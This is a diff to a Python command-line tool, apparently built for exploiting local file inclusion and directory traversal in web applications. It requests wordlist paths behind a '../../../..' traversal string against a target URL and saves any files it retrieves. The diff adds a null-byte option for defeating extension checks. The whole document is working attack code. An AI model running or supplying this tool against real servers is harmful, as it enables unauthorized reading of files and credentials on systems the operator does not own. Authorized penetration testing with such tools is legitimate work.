@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 
-# TODO: Null Byte
 # Ideas listed on  https://highon.coffee/blog/lfi-cheat-sheet/
 # LFI Payloads: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
-
+# TODO: Automatically detect if a null byte needs to be added
 
 import requests,sys,argparse,os,time
 from urllib.parse import quote
@@ -32,7 +31,7 @@ def printTraversalHints():
 
 
 def loadWordlist(wordlistfile):
-	vprint("Loading wordlist...")
+	vprint("Loading wordlist from {}...".format(wordlistfile))
 	wordlist=[]
 	try:
 		with open(wordlistfile,"r") as file:
@@ -44,17 +43,13 @@ def loadWordlist(wordlistfile):
 		print(str(e))
 		exit()
 	
-	vprint('Loaded %d paths to check.' % (len(wordlist)))
-	vprint(wordlist)
-	vprint('------------------------\n')
-
+	print('Loaded %d paths to check.' % (len(wordlist)))
+	dprint("DEBUG: Loaded wordlist: {}".format(wordlist))
 	return wordlist
 
 
 
 def createDir(directory):
-	
-	#newdir=os.path.join(os.getcwd(),directory)    # creates perms of d--------x
 	newdir=Path(os.getcwd(),directory)  
 	vprint("Creating {}".format(newdir))
 
@@ -71,8 +66,6 @@ def createDir(directory):
 
 
 def writeFile(filename,content,directory):
-	print("Writing file {} in {}".format(filename,directory))
-
 
 	# First crunch the path/filename from target to a flat file name
 	tmpfile=filename
@@ -89,18 +82,15 @@ def writeFile(filename,content,directory):
 	tmpfile=tmpfile.replace(':','')
 	tmpfile=tmpfile.replace('\\','_')
 
-	print(tmpfile)
-
 	# Build the full file path
 	d=Path(directory)
 	f=d/tmpfile
-
-	print(f)
 
 	# Then open the file and write it.
 	f=str(f).rstrip()
 
 	if len(content)>0:
+		print("Writing file {}".format(f))
 		try:
 			fh = open(f,"w")
 			fh.write(content)
@@ -109,36 +99,51 @@ def writeFile(filename,content,directory):
 			raise
 
 
-
-
-
-def testLFI(path,wordlist,directory=None):
+def testLFI(path,wordlist,directory=None,null=False):
 	"The meat of the program. iterate through word list and request each file. Write files out if requested"
+	print("------------------------------------------------------------------------")
 	for line in wordlist:
-		url=(path+line).rstrip()
+		# remove any unexpected EOL whitespace 
+		line=line.rstrip()
+
+
+		url=path+line
+
+		# If user flags for null byte. 
+		if null:
+			vprint("Appending null byte")
+			url+="\x00"
+
 		vprint("Requesting {}".format(url))
 		
 		try:
-			r=requests.get(url)
+			r=requests.get(url,allow_redirects=False)
 		except Error as e:
 			raise
 
+		dprint("DEBUG: Response: {}, Status: {}, Length {}".format(url,str(r.status_code),str(r.headers["Content-Length"])),end='\n')
+		dprint("DEBUG: Response Headers: {}".format(r.headers))
 
-		vprint("Request: {}, Status: {}, Length {}".format(url,str(r.status_code),str(r.headers["Content-Length"])),end='\n')
+		# Detect, alert and exit on HTTP redirection
+		if r.status_code>300 and r.status_code <=399:
+			print("WARNING: Redirected to {}".format(r.headers["location"]))
+			print("Aborting...")
+			exit()
 
-		if r.status_code:
+		if r.status_code==200:
 			if int(r.headers["Content-Length"])==0:
-				vprint("No content")
-				print("------------------------")
+				vprint("{}: No content".format(line))
+				vprint("------------------------------------------------------------------------")
 			else:
-				print(url)
-				print(r.text)
-				
+				print("Success: {}\t".format(url))
+				vprint(r.text)
 				# If we were passed a directory, write the response body in there.
 				if directory!=None:
 					writeFile(line,r.text,directory)
+				print("------------------------------------------------------------------------")
 		else:
-			print(str(r.status_code)+ " Error requesting "+url)
+			print("{} Error requesting {}.".format(str(r.status_code),url))
+			#print(str(r.status_code)+ " Error requesting "+url)
 
 
 def main(args):
@@ -151,13 +156,12 @@ def main(args):
 
 	# Build out the base URL from commandline arguments to test against
 	
-	if args.count==0:
-		exit()
-
 	base_url=args.url
 	path_traversal_escape=args.path_traversal_string
-	path=base_url+path_traversal_escape
 	outdir=args.outdir
+
+	path=base_url+path_traversal_escape
+
 
 	# Load wordlist from file.
 	wordlistfile=args.wordlist
@@ -167,9 +171,11 @@ def main(args):
 	if outdir!=None:
 		print("Output directory: {}".format(outdir))
 		fulldir=createDir(outdir)
+	else:
+		fulldir=None
 
 #	exit()		# Exit for now
-	testLFI(path,wordlist,fulldir)
+	testLFI(path,wordlist,fulldir,args.nullbyte)
 
 
 
@@ -189,7 +195,8 @@ if __name__== '__main__':
 	parser.add_argument(
 						  "-p",
 						  "--path_traversal_string",
-						  help="The string required to reach the root directory. e.g. ../../../..")
+						  default="../../../..",
+						  help="The string required to reach the root directory. Default to  ../../../..")
 	parser.add_argument(
 	                      "-w",
 	                      "--wordlist",
@@ -200,6 +207,12 @@ if __name__== '__main__':
 	                      help="increase output verbosity",
 	                      action="store_true")
 	parser.add_argument(
+	                      "-d",
+	                      "--debug",
+	                      help="debug output",
+	                      action="store_true")
+
+	parser.add_argument(
 						  "-o",
 						  "--outdir",
 						  help="Specify a directory relative to the current directory to save files. Filenames will be flattened in here")
@@ -208,6 +221,12 @@ if __name__== '__main__':
 						  "--traversal",
 						  help="Prints some example directory traversal strings to try.",
 						  action="store_true")
+	parser.add_argument(
+						  "-n",
+						  "--nullbyte",
+						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
+						  action="store_true")
+
 	parser.add_argument(
 						  "-r",
 						  "--remote",
@@ -222,6 +241,9 @@ if __name__== '__main__':
 
 	# Define a verbose printing mechanism
 	vprint = print if args.verbose else lambda *a, **k: None
+
+	#define a seperate debug print
+	dprint = print if args.debug else lambda *a, **k: None
 
 main(args)
 
